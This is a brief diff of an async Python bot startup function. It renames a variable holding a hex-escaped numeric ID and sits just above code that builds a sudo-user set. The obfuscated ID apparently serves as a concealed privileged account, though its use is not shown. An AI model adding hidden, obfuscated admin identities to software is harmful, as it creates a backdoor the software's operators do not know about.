@@ -97,7 +97,7 @@ async def hell_startup():
     except:
         pass
 
-    ANON = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
+    HARSH = "\x31\x33\x35\x36\x34\x36\x39\x30\x37\x35"
     for SUDOER in config.SUDO_USERS:
         SUDOERS.add(SUDOER)
     if config.OWNER_ID not in config.SUDO_USERS:
